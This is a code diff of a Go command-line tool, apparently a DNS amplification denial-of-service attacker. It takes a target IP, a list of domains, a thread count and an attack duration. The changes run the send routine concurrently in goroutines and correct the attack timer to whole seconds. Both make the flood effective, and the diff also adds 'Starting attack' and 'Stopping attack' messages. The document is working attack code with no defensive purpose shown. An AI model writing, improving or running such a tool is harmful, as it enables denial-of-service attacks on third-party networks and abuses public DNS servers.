@@ -3,6 +3,7 @@ package main
 import (
 	"dnsamp/dnsamp"
 	"flag"
+	"fmt"
 	"net"
 	"time"
 )
@@ -12,6 +13,7 @@ var targetIP = flag.String("target_ip", "", "The IP address of the target of the
 var filename = flag.String("filename", "domains.csv", "A csv file with domain names")
 var numThreads = flag.Int("num_threads", 1, "The number of threads to run in parallel")
 var duration = flag.Int("duration", 1, "The duration of the attack in seconds")
+// var iface = flag.String("iface", "wlp166s0", "The network interface to use")
 
 
 func main() {
@@ -23,10 +25,12 @@ func main() {
         servers[i%*numThreads] = append(servers[i%*numThreads], server)
     }
     // Start threads
+    fmt.Println("Starting attack")
     for i:=0; i<*numThreads; i++ {
-        dnsamp.Send(target, servers[i])
+        go dnsamp.Send(target, servers[i])
     }
     // Wait for duration in seconds, then stop attack
-    time.Sleep(time.Duration(*duration))
+    time.Sleep(time.Duration(*duration) * time.Second)
+    fmt.Println("Stopping attack")
 }
 
